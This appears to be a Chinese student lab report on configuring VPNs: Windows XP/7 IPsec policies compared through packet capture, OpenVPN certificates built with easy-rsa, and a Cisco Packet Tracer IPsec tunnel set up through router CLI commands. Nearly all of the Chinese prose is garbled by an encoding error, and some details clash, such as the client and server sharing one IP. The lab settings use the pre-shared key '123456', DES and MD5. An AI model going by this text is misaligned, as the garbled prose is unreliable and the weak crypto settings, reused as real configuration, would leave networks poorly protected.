\\telnetç­‰å‘½ä»¤è¿›è¡Œå¯¹æ¯”éªŒè¯) é…ç½®OPENVPNï¼Œåˆ©ç”¨2è‡³3å°ä¸»æœºç‹¬ç«‹å®Œæˆè™šæ‹Ÿä¸“ç½‘çš„æ­å»ºï¼Œå¹¶éªŒè¯è™šæ‹Ÿä¸“ç½‘çš„å®‰å…¨æ€§ï¼ˆç”¨æŠ“åŒ…å·¥å…·åˆ†æï¼Œæç¤ºï¼šå¯ä»¥ä½¿ç”¨ping\\net send \\telnetç­‰å‘½ä»¤è¿›è¡Œå¯¹æ¯”éªŒè¯ï¼‰ã€‚ PacketTraceré‡ŒVPNé…ç½®å®éªŒã€‚ï¼ˆé€‰åšï¼‰ 0x02 Windows IPSECé…ç½® é…ç½®ç¯å¢ƒï¼šwindows xp \u0026amp; windows 7 æŸ¥çœ‹win xpå’Œwin 7çš„IPåœ°å€ windows xp : 192.168.195.131 windows 7 : 192.168.195.176 2.1 windows xp IPSECé…ç½® æ‰“å¼€windows xpè™šæ‹Ÿæœºï¼Œé€šè¿‡secpol.mscæ‰“å¼€æœ¬åœ°å®‰å…¨è®¾ç½®\nåœ¨IPå®‰å…¨ç­–ç•¥ä¸‹å³é”®ï¼Œåˆ›å»ºå®‰å…¨ç­–ç•¥\nè®¾ç½®é…ç½®åç§°ä¸ºreus09\næ¿€æ´»é»˜è®¤å“åº”è§„åˆ™ èº«ä»½è®¤è¯æ–¹æ³•é‡‡ç”¨æ­¤å­—ç¬¦ä¸²ç”¨æ¥ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥123456 å›åˆ°åŸæ¥çª—å£ï¼Œé¼ æ ‡å³é”®ï¼ŒæŒ‡æ´¾\né¼ æ ‡å³é”®ï¼Œå±æ€§ï¼Œæ·»åŠ è§„åˆ™å¹¶è¿›è¡Œç›¸åº”çš„é…ç½®\né€‰æ‹©æ­¤è§„åˆ™ä¸æŒ‡å®šéš§é“\né€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥\nèº«ä»½éªŒè¯æ–¹æ³•é‡‡ç”¨æ­¤å­—ç¬¦ä¸²ç”¨æ¥ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥å­—ç¬¦ä¸²ï¼š123456\nIPç­›é€‰åˆ—è¡¨é€‰æ‹©æ‰€æœ‰IPé€šè®¯é‡\nç­›é€‰å™¨æ“ä½œé€‰æ‹©éœ€è¦å®‰å…¨\nç‚¹å‡»ä¸‹ä¸€æ­¥å®Œæˆ\nè‡³æ­¤ï¼ŒWindows xpä¸‹çš„IPSECé…ç½®å®Œæˆï¼Œæ“ä½œè¿‡ç¨‹ä¸­æ²¡æœ‰æŠ¥é”™ã€‚\n2.2 windows 7 IPSECé…ç½® ä»¥åŒæ ·çš„æ–¹å¼é…ç½®windows 7ä¸‹çš„IPSECï¼Œè¿™é‡Œä¸windows xpé…ç½®å¤§è‡´ç›¸åŒï¼Œæˆªå›¾åªç”¨äºè¯´æ˜ä¸åŒç‚¹ã€‚é€šè¿‡secpol.mscæ‰“å¼€windows 7æœ¬åœ°å®‰å…¨è®¾ç½® åœ¨IPå®‰å…¨ç­–ç•¥ä¸‹å³é”®ï¼Œåˆ›å»ºå®‰å…¨ç­–ç•¥ è®¾ç½®é…ç½®åç§°ä¸ºreus09ï¼ˆä¸ªäººéšæ„ï¼‰ï¼Œç”±äºæ¿€æ´»é»˜è®¤å“åº”è§„åˆ™ä»…é™äºwindowsæ—©æœŸç‰ˆæœ¬ï¼Œæ•…ä¸é€‰æ‹©æ¿€æ´»é»˜è®¤å“åº”è§„åˆ™ï¼Œè¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰èº«ä»½è®¤è¯é€‰æ‹© ç‚¹å‡»é»˜è®¤è®¾ç½®ï¼Œä¸€ç›´åˆ°å±æ€§çª—å£ï¼Œæ·»åŠ è§„åˆ™ï¼šé€‰æ‹©æ­¤è§„åˆ™ä¸æŒ‡å®šéš§é“ã€é€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥ã€åœ¨IPç­›é€‰åˆ—è¡¨ä¸­ç‚¹å‡»æ·»åŠ ï¼Œåç§°ä¸ºæ–°IPç­›é€‰åˆ—è¡¨ï¼Œå¹¶ç‚¹å‡»æ·»åŠ ï¼Œä¹‹åé€‰æ‹©é»˜è®¤æ“ä½œ é€‰æ‹©åˆšåˆšå»ºç«‹çš„IPç­›é€‰åˆ—è¡¨ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ é€‰æ‹©æ·»åŠ IPç­›é€‰å™¨æ“ä½œ, é€‰æ‹©åå•†å®‰å…¨,ç»§ç»­é»˜è®¤æ“ä½œ é€‰æ‹©åˆšåˆšå»ºç«‹çš„æ–°ç­›é€‰å™¨æ“ä½œï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ èº«ä»½éªŒè¯æ–¹æ³•é‡‡ç”¨æ­¤å­—ç¬¦ä¸²ç”¨æ¥ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥å­—ç¬¦ä¸²ï¼š123456(ä¸ä¸Šé¢çš„ç›¸åŒ) å•å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©é»˜è®¤æ“ä½œç›´è‡³ç­›é€‰å™¨é…ç½®å®Œæˆ å›åˆ°åŸæ¥çª—å£ï¼Œé¼ æ ‡å³é”®ï¼Œåˆ†é…ï¼Œè‡³æ­¤ï¼ŒWindows 7ä¸‹çš„IPSECé…ç½®å®Œæˆï¼Œæ“ä½œè¿‡ç¨‹ä¸­æ²¡æœ‰æŠ¥é”™ 2.3 å¼€å§‹é€šä¿¡ å…³é—­win 7çš„IPSECæœåŠ¡ ä½¿ç”¨win 7 ping win xpï¼Œè¯·æ±‚è¶…æ—¶ï¼Œpingä¸é€š å¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ï¼Œå¯ä»¥çœ‹åˆ°win 7ä¸€ç›´è¯·æ±‚IPsec SAä½†æ€»ä¸æˆåŠŸ é‡æ–°å¼€å¯win 7çš„IPSECæœåŠ¡ 2.3.1 é»˜è®¤å®‰å…¨ç­–ç•¥ ä½¿ç”¨win 7é‡æ–°ping win xpï¼Œå‘ç°æˆåŠŸpingé€š å¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ï¼Œç”±äºæ­¤æ—¶win xpå’Œwin7éƒ½é‡‡ç”¨çš„æ˜¯é»˜è®¤çš„espåŠ å¯†ï¼Œæ‰€ä»¥æŠ“åŒ…æ˜¾ç¤ºçš„æ˜¯espåŒ… 2.3.2 ä»…AHé€šä¿¡,ä¸ç»è¿‡ESPåŠ å¯† Win 7å’Œwin xpéƒ½è®¾ç½®ä»…AHé€šä¿¡ï¼Œä¸ç»è¿‡ESPåŠ å¯† window 7 windows xp ç»§ç»­ä½¿ç”¨win 7 ping win xp å¯¹é€šä¿¡è¿‡ç¨‹è¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°æ²¡æœ‰ESPåŠ å¯†åæ•°æ®åŒ…æ ¼å¼ä¸ºICMPï¼Œæ•°æ®ä¸ºabcdef 2.3.3 Win 7å’Œwin xpä»…espè®¤è¯ windows 7 windows xp å¯ä»¥çœ‹åˆ°æ²¡æœ‰espåŠ å¯†åçš„æ•°æ®æ˜¯abcdefg åŒæ—¶ä¹Ÿå¯ä»¥æ³¨æ„åˆ°å¼€å¯espåŠ å¯†ä¹‹åçš„espåŠ å¯†çš„æ•°æ®è¢«åŠ å¯†éšè—äº† 2.3.4 åˆ†æIKE SAå’ŒIPSEC SAå»ºç«‹è¿‡ç¨‹ è¦å»ºç«‹IPSecè¿æ¥ï¼Œé¦–å…ˆè¦åå•†ä¸€ä¸ªIKE SAï¼Œç„¶ååœ¨IKE SAçš„åŸºç¡€ä¸Šåå•†IPSec SA IKE SAå»ºç«‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µ SAäº¤æ¢ï¼Œåå•†ç¡®è®¤æœ‰å…³å®‰å…¨ç­–ç•¥ã€‚è¯¥è¿‡ç¨‹è¿›è¡Œå®‰å…¨åå•† å¯†é’¥äº¤æ¢é˜¶æ®µï¼Œä¸»è¦äº¤æ¢å¯†é’¥Diffie-Hellmanå…¬å…±å€¼ã€‚æ•°æ®åŒ…ä¸­çš„Key Exchangeç”¨äºäº¤æ¢å„è‡ªåŠ å¯†ç”Ÿæˆçš„ä¸»å¯†é’¥ï¼›Nonceä½¿ç”¨äº†éšæœºæ•°ï¼Œé˜²æ­¢é‡æ”¾æ”»å‡»ï¼›åŠ å¯†æ‰€ç”¨çš„å¯†é’¥ä¸ºipsecä¸­è®¾å®šçš„é¢„å…±äº«å¯†é’¥ï¼› NAT-Dä¸ºåŒæ–¹çš„ip+ç«¯å£çš„Hashå€¼ã€‚ IDä¿¡æ¯å’Œè®¤è¯æ•°æ®äº¤æ¢ï¼Œè¿›è¡Œèº«ä»½è®¤è¯ï¼Œå¯¹ç¬¬ä¸€é˜¶æ®µäº¤æ¢å†…å®¹çš„è®¤è¯ã€‚ IPSec SAå»ºç«‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œéƒ½æ˜¯åŠ å¯†æ•°æ®ï¼Œæ— æ³•æŸ¥çœ‹ã€‚ç”¨åˆ°äº†Quick-Modeï¼Œç›®çš„æ˜¯åœ¨ä¸¤ä¸ªå¯¹ç­‰ä½“é—´åå•†ä¸€ç»„ä¸€è‡´çš„å‚æ•°æ¥åˆ›å»ºIPSec SAï¼Œç”¨äºçœŸå®æ•°æ®çš„åŠ è§£å¯†ï¼Œå¹¶ä¸”åœ¨æ­¤è¿›è¡ŒPFSï¼ŒPFSåŠåœ¨Quick-Modeé‡æ–°åšDHçš„äº¤æ¢ï¼Œäº§ç”Ÿæ–°çš„å¯†é’¥ç”¨äºIPSecæ•°æ®çš„åŠ å¯†ã€‚ 2.3.5 æ€è€ƒ Qï¼šIKEå¯†é’¥åå•†è¿‡ç¨‹æ˜¯å¦å­˜åœ¨å®‰å…¨å¨èƒï¼Ÿ Aï¼šIPSecå¯†é’¥äº¤æ¢è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹é˜¶æ®µã€‚ç¬¬ä¸€é˜¶æ®µé€šä¿¡åŒæ–¹å½¼æ­¤å»ºç«‹ä¸€ä¸ªé€šè¿‡èº«ä»½è®¤è¯å’Œå®‰å…¨ä¿æŠ¤çš„éš§é“ï¼Œç§°ä¸ºISAKMP SAã€‚åªè¦ISAKMP SAå»ºç«‹èµ·æ¥ï¼Œæ‰€æœ‰å‘èµ·æ–¹å’Œåº”ç­”æ–¹ä¹‹é—´çš„IKEé€šä¿¡ä¿¡æ¯éƒ½é€šè¿‡åŠ å¯†ã€å®Œæ•´æ€§æ£€æŸ¥å’Œè®¤è¯çš„æ–¹æ³•å—åˆ°ä¿æŠ¤ã€‚ç¬¬äºŒé˜¶æ®µçš„å»ºç«‹æ˜¯ä¸ºç‰¹å®šçš„Internetå®‰å…¨åè®®(å¦‚IPSecç­‰)åˆ›å»ºå®‰å…¨å…³è”(IPSec SA)ã€‚IKEç¬¬ä¸€é˜¶æ®µçš„ç›®çš„æ˜¯å»ºç«‹ä¸€ä¸ªå®‰å…¨éš§é“ï¼Œä½¿å¾—ç¬¬äºŒé˜¶æ®µçš„åå•†å¯ä»¥ç§˜å¯†åœ°è¿›è¡Œã€‚ä¸¤å°ä¸»æœºä¹‹é—´å¯ä»¥åŒæ—¶å»ºç«‹å¤šä¸ªISAKMP SAï¼Œä¸€ä¸ªISAKMP SAä¹Ÿå¯ä»¥åˆ›å»ºå¤šä¸ªIPSec SAï¼ŒISAKMP SAçš„ç»“æŸä¸ä¼šå½±å“å®ƒåˆ›å»ºçš„IPSec SAå‘ç”Ÿä½œç”¨ã€‚è¿™ç§å¯†é’¥åå•†è¿‡ç¨‹æ˜¯å­˜åœ¨ç€æ¼æ´çš„ï¼Œå¯ä»¥é€šè¿‡ä¸­é—´äººæ”»å‡»å’Œæ‹’ç»æœåŠ¡æ”»å‡»å®ç°æ¼æ´åˆ©ç”¨ã€‚ 0x03 é…ç½®OPENVPN 4.1 ç½‘ç»œç¯å¢ƒ æœåŠ¡å™¨ç«¯ Windows xp: 192.168.195.131 client IP :192.168.195.131 4.2 ç¯å¢ƒä¿®æ”¹ æŠŠ easy-rsa ç›®å½•ä¸‹çš„ vars.bat.sample æ”¹åä¸º vars.batï¼Œå¹¶ä¸”ä¿®æ”¹å…¶å†…å®¹\næŠŠ easy-rsa ä¸‹çš„ openssl.cnf.sample æ”¹æˆ openssl.cnfã€‚\nç„¶åè¿›å…¥ cmd.exe\nç”Ÿæˆ Root CA\næ ¼å¼: build-ca.bat\nè¾“å‡º: keys/ca.crt keys/ca.key\nç”Ÿæˆ dh1024.pem æ–‡ä»¶ï¼ŒServer ä½¿ç”¨ TLS å¿…é¡»ä½¿ç”¨çš„ä¸€ä¸ªæ–‡ä»¶ã€‚\næ ¼å¼: build-dh.bat\nè¾“å‡º: keys/dh1024.pem\nä¸‹é¢ç”ŸæˆæœåŠ¡ç«¯è¯ä¹¦ã€å®¢æˆ·ç«¯è¯ä¹¦å’Œ TA è¯ä¹¦ï¼š\nä¸‹é¢å¼€å§‹ç”Ÿæˆ Server ä½¿ç”¨çš„è¯ä¹¦äº†ï¼š\næ ¼å¼: build-key-server.bat è¾“å‡º: keys/.crt .csr .key\nä¸‹é¢å¼€å§‹ä¸º client åŠæ³•è¯ä¹¦ï¼š\næ ¼å¼: build-key.bat è¾“å‡º: keys/.crt keys/.csr keys/.key\nä¸‹é¢ç”Ÿæˆ ta.key æ–‡ä»¶\næ ¼å¼: openvpn \u0026ndash;genkey \u0026ndash;secret keys/ta.key\nè¾“å‡º: keys/ta.key\næœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯çš„é…ç½®:\nserver.opvné…ç½® æŠŠ easy-rsa\\keys\\ä¸‹çš„ ca.crt server.crt server.key ta.key dh1024.pemå¤åˆ¶åˆ° server.ovpn æ‰€åœ¨ç›®å½•ã€‚ å¯ä»¥çœ‹åˆ°serverç«¯è¿æ¥ï¼šVPNçš„IPä¸º10.8.0.0 Client\nclient.opvné…ç½® æœåŠ¡ç«¯ä¸»æœº easy-rsa/keys ä¸‹çš„ ca.crt client.crt client.key ta.key ä¸€èµ·æ”¾åˆ°å®¢æˆ·æœºçš„\u0026lt;OPENVPN_HOME\u0026gt;\\config ç›®å½•ä¸‹ã€‚ è¿æ¥æ•ˆæœå›¾ 4.3 è¿æ¥æµ‹è¯• 0x04 PacketTrace VPNé…ç½® 5.1 å®éªŒç¯å¢ƒ ç³»ç»Ÿï¼šWindows xp è½¯ä»¶å·¥å…·ï¼šæ€ç§‘å®˜æ–¹æ¨¡æ‹Ÿå™¨Packet Tracer 5.3 æ¨¡æ‹Ÿå®ä½“ï¼š2å°cisco2800ç³»åˆ—è·¯ç”±å™¨ã€2å°24ç«¯å£ä»¥å¤ªç½‘äº¤æ¢æœºå’Œè‹¥å¹²PCç”µè„‘ 5.2 åˆå§‹åŒ–è·¯ç”±å™¨ å®‰è£…Packet Tracer 5.3\né…ç½®å®‰å…¨ç­–ç•¥\næ–°å»ºä¸€æ¡å®‰å…¨ç­–ç•¥PacketTracerï¼Œæ·»åŠ IPå®‰å…¨è§„åˆ™ï¼Œéš§é“æ–¹å¼ä¸ºä¸æŒ‡å®šéš§é“ï¼Œç½‘ç»œç±»å‹é€‰æ‹©æ‰€æœ‰ç½‘ç»œè¿æ¥ï¼Œèº«ä»½éªŒè¯æ–¹æ³•é€‰æ‹©ç”¨å­—ç¬¦ä¸²ä¿æŠ¤å¯†é’¥äº¤æ¢ï¼Œè¾“å…¥ï¼š123456ï¼›è¿›å…¥IPç­›é€‰å™¨åˆ—è¡¨çš„é…ç½®é¡¹ï¼Œè®¾ç½®ä¸€ä¸ªæ–°çš„IPç­›é€‰å™¨åˆ—è¡¨ï¼Œæ–°å»ºä¸€ä¸ªIPç­›é€‰å™¨ï¼Œå°†æˆ‘çš„IPåœ°å€ä½œä¸ºæºåœ°å€ï¼Œå°†ä»»ä½•IPåœ°å€ä½œä¸ºç›®æ ‡åœ°å€ï¼Œåœ¨é€‰æ‹©åè®®ç±»å‹ä¸­é€‰ä¸­ä»»æ„ï¼Œæ–°å»ºä¸€ä¸ªç­›é€‰æ“ä½œï¼Œè®¾ç½®ä¸ºåå•†å®‰å…¨ï¼Œé€‰ä¸­ä¸å’Œä¸æ”¯æŒIPSecçš„è®¡ç®—æœºé€šè®¯ï¼Œä»¥è¦æ±‚å¿…é¡»åœ¨IPSecåŸºç¡€ä¸Šè¿›è¡Œè¿æ¥ï¼ŒIPé€šè®¯å®‰å…¨è®¾æ–½ä¸­é€‰æ‹©é€‰æ‹©è‡ªå®šä¹‰ï¼Œç„¶åç‚¹å‡»è®¾ç½®é€‰æ‹©å¦‚ä¸‹å›¾ï¼Œé€‰æ‹©é»˜è®¤ç›´è‡³é…ç½®å®Œæˆ åˆå§‹åŒ–é…ç½®è·¯ç”±å™¨\næ‰“å¼€ciscoæ¨¡æ‹Ÿå™¨ï¼Œåœ¨æ¨¡æ‹Ÿå™¨çª—å£å·¥å…·æ ä¸‹é€‰æ‹©file--newã€‚åœ¨å·¦ä¸‹è§’è®¾å¤‡æ é€‰å–è·¯ç”±å™¨ã€‚ å°†cisco2811è·¯ç”±å™¨æ‹–åˆ°å·¥ä½œåŒºåŸŸï¼Œå•å‡»å·¥ä½œåŒºåŸŸçš„è·¯ç”±å™¨å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œå¼¹å‡ºå¦‚å›¾æ‰€ç¤ºç•Œé¢ è¿›å…¥è·¯ç”±å™¨ç‰¹æƒæ¨¡å¼é…ç½®è·¯ç”±å™¨ç½‘å¡IPï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 Router\u0026gt;enable\t//è¿›å…¥ç‰¹æƒæ¨¡å¼ï¼Œåªæœ‰åœ¨ç‰¹æƒæ¨¡å¼ä¸‹æ‰å¯ä»¥å¯¹è·¯ç”±å™¨è¿›è¡Œé…ç½® Router#configure terminal\t//è¿›å…¥é…ç½®çŠ¶æ€ï¼Œé€šè¿‡ç«¯å£è¿›è¡Œé…ç½® Router(config)# interface fastEthernet 0/0\t//è¿›å…¥ç«¯å£f0/0 Router(config-if)#ip address 10.0.0.1 255.255.255.0\t#é…ç½®ç½‘å¡f0/0çš„ipåœ°å€å’Œå­ç½‘æ©ç  Router(config-if)#no shutdown\t//å¼€å¯ç«¯å£f0/0 Router(config-if)#end\t//è¿”å›ç‰¹æƒæ¨¡å¼ Router#configure terminal\t//è¿›å…¥é…ç½®çŠ¶æ€ï¼Œé€šè¿‡ç«¯å£è¿›è¡Œé…ç½® Router(config)# interface fastEthernet 0/1 //è¿›å…¥ç«¯å£f0/1 Router(config-if)#ip address 192.168.1.1 255.255.255.0 //é…ç½®ç½‘å¡f0/1çš„ipåœ°å€å’Œå­ç½‘æ©ç  Router(config-if)#no shutdown\t//å¼€å¯ç«¯å£f0/1 Router(config-if)#end\t//è¿”å›ç‰¹æƒæ¨¡å¼ åˆå§‹é…ç½®router 0å®Œæˆï¼Œæ ¹æ®router 0çš„é…ç½®è¿‡ç¨‹å®Œæˆrouter 1çš„é…ç½®ï¼Œå…¶ä¸­router 1çš„f0/0ç«¯å£IPä¸º10.0.0.2/24, router 1çš„f0/1ç«¯å£çš„IPåœ°å€ä¸º192.168.2.1/24\né…ç½®å®Œæˆåï¼Œç‚¹å‡»é€‰æ‹©å°†router 0å’Œrouter 1çš„f0/0ç«¯å£è¿æ¥\n5.3 æ­å»ºç½‘ç»œç¯å¢ƒ åœ¨æ¨¡æ‹Ÿå™¨å·¦ä¸‹è§’é€‰æ‹©PC\næ‹–åˆ°ç»˜å›¾å·¥ä½œåŒºï¼ŒåŒå‡»PCå›¾æ ‡ï¼Œé€‰æ‹©Desktopï¼Œå¦‚å›¾æ‰€ç¤º é€‰æ‹©IP Configurationï¼Œé…ç½®PCçš„IPåœ°å€å’Œå­ç½‘æ©ç ï¼Œå¦‚å›¾æ‰€ç¤º\né‡å¤ä¸Šè¿°æ“ä½œï¼Œé…ç½®å…­å°PCï¼Œå®ƒä»¬çš„IPåœ°å€åˆ†åˆ«ä¸º\n192.168.1.10 192.168.1.20 192.168.1.30 192.168.2.10 192.168.2.20 192.168.2.30 å­ç½‘æ©ç å…¨ä¸º255.255.255.0ï¼Œå‰ä¸‰å°ç½‘å…³ä¸º192.168.1.1ï¼Œåä¸‰å°ç½‘å…³ä¸º192.168.2.1\né€‰å–äº¤æ¢æœº\nå°†è·¯ç”±å™¨äºäº¤æ¢æœºç›¸è¿ï¼Œå°†äº¤æ¢æœºäºPCç›¸è¿ï¼›æœ€ç»ˆå®Œæˆå¦‚å›¾æ‰€ç¤ºçš„ç½‘ç»œå›¾ 5.4 é…ç½®è·¯ç”± åœ¨è·¯ç”±å™¨ä¸­é…ç½®è·¯ç”±ï¼Œä½¿è·¯ç”±å™¨ä¸¤ç«¯çš„ç½‘ç»œäº’é€š\né…ç½®router 0ï¼ŒåŒå‡»router 0å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£ï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //é…ç½®å†…ç½‘è®¿é—®å¤–éƒ¨ç½‘ç»œçš„å‡ºå£è·¯ç”± Router(config)#ip route 192.168.1.0 255.255.255.0 fastEthernet 0/1 //é…ç½®å¤–éƒ¨è®¿é—®å†…éƒ¨ç½‘ç»œå…¥å£è·¯ç”± Router(config)#end é…ç½®router 1ï¼ŒåŒå‡»router 1å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£ï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //é…ç½®å†…ç½‘è®¿é—®å¤–éƒ¨ç½‘ç»œçš„å‡ºå£è·¯ç”± Router(config)#ip route 192.168.2.0 255.255.255.0 fastEthernet 0/1 //é…ç½®å¤–éƒ¨è®¿é—®å†…éƒ¨ç½‘ç»œå…¥å£è·¯ç”± Router(config)#end 5.5 æµ‹è¯•ç½‘ç»œäº’é€šæ€§ åŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Prompt\nä½¿ç”¨pingå‘½ä»¤ï¼Œping 192.168.1.1ã€10.0.0.1ã€192.168.2.10ã€10.0.0.2ã€192.168.3.10ç»“æœé™¤äº†æœ€åä¸€ä¸ªåœ°å€(è¯¥åœ°å€ä¸å­˜åœ¨)å…¶å®ƒå…¨èƒ½pingé€šï¼Œè¡¨æ˜æ­å»ºçš„ç½‘ç»œæ»¡è¶³å®éªŒç¯å¢ƒ\n0x05 IPSECéš§é“æ¨¡å¼VPN 5.1 é…ç½®IPSec VPN é…ç½®router 0ï¼ŒåŒå‡»router 0å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£\nå®šä¹‰IKEçš„ç­–ç•¥(router 0å’Œrouter1ä¹‹é—´çš„å¯†é’¥äº¤æ¢ç­–ç•¥)ï¼ŒIKEåªæ˜¯å¯†é’¥çš„äº¤æ¢ç­–ç•¥,åœ¨ä½¿ç”¨åŠ å¯†å¯¹ç§°å’Œéå¯¹ç§°åŠ å¯†ç®—æ³•çš„æ—¶å€™,éœ€è¦å¯†é’¥æ¥å¯¹æ•°æ®åŠ å¯†,ä¸‹é¢çš„IKEç­–ç•¥åªæ˜¯å»ºç«‹ä¸€æ¡ç®¡ç†è¿æ¥ï¼Œè´Ÿè´£åŠ å¯†ç”Ÿæˆçš„å„ç§å¯†é’¥ï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 Router#configure terminal\t//è¿›å…¥é…ç½®çŠ¶æ€ï¼Œé€šè¿‡ç«¯å£è¿›è¡Œé…ç½® Router (config)#crypto isakmp policy 10\t//ä¸€ä¸ªIKEçš„ç­–ç•¥ï¼Œå·ç æ˜¯10ï¼Œæ•°å­—è¶Šä½ï¼Œç­–ç•¥ä¼˜å…ˆçº§è¶Šé«˜ Router (config-isakmp)# authentication pre-share\t//ä½¿ç”¨é¢„å®šä¹‰å…±äº«å¯†é’¥è¿›è¡Œè®¾å¤‡è®¤è¯ Router (config-isakmp)#hash md5\t//è®¤è¯æ–¹å¼ä½¿ç”¨MD5è¿›è¡Œè®¤è¯ Router (config-isakmp)#encryption des\t//åŠ å¯†æ–¹å¼ä½¿ç”¨DESï¼Œå¯é€‰AES/DES Router (config-isakmp)#group 2\t//æŒ‡å®šDHç»„ Router (config-isakmp)# lifetime 86400\t//å¯¹ç”Ÿæˆæ–°SAçš„å‘¨æœŸè¿›è¡Œè°ƒæ•´ï¼Œä¸¤ç«¯çš„è·¯ç”±å™¨éƒ½è¦è®¾ç½®ç›¸åŒçš„SAå‘¨æœŸ Router (config-isakmp)# exit Router (config)#crypto isakmp key reus09 address 10.0.0.2 //å®šä¹‰ä¸€ä¸ªå¯†ç ,å¯†ç æ˜¯reus09ï¼Œå’Œåœ°å€ä¸º10.0.0.2çš„è®¾å¤‡å»äº¤æ¢å¯†é’¥ å®šä¹‰æ•°æ®çš„åŠ å¯†æ–¹å¼å’Œè®¤è¯æ–¹å¼ï¼Œé…ç½®IPSecï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 Router (config)#access-list 110 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255\t//å®šä¹‰è®¿é—®æ§åˆ¶åˆ—è¡¨,è¿™é‡Œçš„è®¿é—®æ§åˆ¶åˆ—è¡¨ä¸æ˜¯å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œæ˜¯å®šä¹‰é‚£äº›æ•°æ®åº”è¯¥è¢«åŠ å¯†ï¼Œä¹Ÿå¯ä»¥ç†è§£å“ªäº›æ•°æ®è§¦å‘IPSec æµ Router (config)#crypto ipsec transform-set mine esp-des esp-md5-hmac\t//è®¾ç½®æ•°æ®çš„åŠ å¯†æ–¹å¼ï¼Œç­–ç•¥åå­—ä¸ºmineï¼Œä½¿ç”¨ESP-DESå¯¹æ•°æ®åŠ å¯†ï¼ŒESP-MD5-HMACå¯¹æ•°æ®è®¤è¯ Router(config)# crypto map mymap 101 ipsec-isakmp //å®šä¹‰ä¸€ä¸ªmap,è°ƒç”¨åˆšæ‰åšçš„ç­–ç•¥ Router(config-crypto-map)# match address 110\t//åŒ¹é…å‡ºè®¿é—®æ§åˆ¶åˆ—è¡¨110çš„æ•°æ® Router(config-crypto-map)# set peer 10.0.0.2 //æ ‡è¯†å¯¹ç«¯è·¯ç”±å™¨çš„åˆæ³•IPåœ°å€ Router(config-crypto-map)# set pfs group2 Router(config-crypto-map)# set transform-set mine //ä½¿ç”¨åˆšæ‰å®šä¹‰å¥½çš„ç­–ç•¥å¯¹æ•°æ®åŠ å¯† Router(config-crypto-map)# set security-association lifetime seconds 86400\t//æŒ‡å®šIPSec SAçš„å­˜æ´»æœŸ å°†mapæ˜ å°„åˆ°å…¬ç½‘ç«¯å£ï¼Œä¸€ä¸ªç«¯å£åªèƒ½æ˜ å°„ä¸€ä¸ªmapï¼Œè¾“å…¥å‘½ä»¤å¦‚ä¸‹\n1 2 3 4 Routerï¼ˆconfigï¼‰interface fastEthernet 0/0 Router(config-if)#crypto map mymap *Jan 3 07:16:26.785: %CRYPTO-6-ISAKMP_ON_OFF: ISAKMP is ON Routerï¼ˆconfig-ifï¼‰end æŸ¥çœ‹ç­–ç•¥\næŸ¥çœ‹IKEç­–ç•¥\n1 Router# show crypto isakmp policy æŸ¥çœ‹IPSecå˜æ¢é›†\n1 Router# show crypto ipsec transform-set æŸ¥çœ‹ crypto maps\n1 Router# show crypto map é…ç½®router 1ï¼ŒåŒå‡»router 1å›¾æ ‡ï¼Œé€‰æ‹©CLIé¡¹ï¼Œè¿›å…¥è·¯ç”±å™¨é…ç½®çª—å£\nå®šä¹‰IKEçš„ç­–ç•¥ï¼Œä¸é…ç½®route 0ç›¸åŒ å®šä¹‰æ•°æ®çš„åŠ å¯†æ–¹å¼å’Œè®¤è¯æ–¹å¼ï¼Œé…ç½®IPSecï¼Œä¸é…ç½®route 0ç›¸åŒ å°†mapæ˜ å°„åˆ°å…¬ç½‘ç«¯å£ï¼Œä¸é…ç½®route 0ç›¸åŒ 5.2 æµ‹è¯•IPSec VPN æµ‹è¯•VPNè¿é€šæ€§\nåŒå‡»PC0å›¾æ ‡ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­ï¼Œé€‰æ‹©Desktopï¼Œé€‰æ‹©Command Promptï¼Œping 192.168.2.10ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\néªŒè¯æ•°æ®ç»è¿‡IPSec VPN åŠ å¯†ä¼ è¾“ï¼Œç‚¹å‡»è¿›å…¥simulation 